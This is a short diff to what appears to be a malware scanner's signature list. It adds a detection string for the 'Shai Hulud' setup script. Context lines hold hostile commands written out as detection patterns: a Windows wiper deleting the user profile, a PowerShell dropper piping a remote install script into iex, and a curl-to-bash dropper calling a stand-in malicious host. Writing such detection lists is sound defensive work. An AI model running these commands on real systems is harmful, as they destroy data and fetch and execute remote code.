@@ -27,6 +27,7 @@ const SIGNATURES = {
         'del /F /Q /S "%USERPROFILE%*"', // Windows wiper
         'irm bun.sh/install.ps1|iex', // PowerShell dropper
         'curl -sL http://malicious.com | bash', // Generic dropper
+        'node setup_bun.js', // Shai Hulud specific
     ],
     // EICAR Test String (for verifying the obfuscation works)
     eicar: [
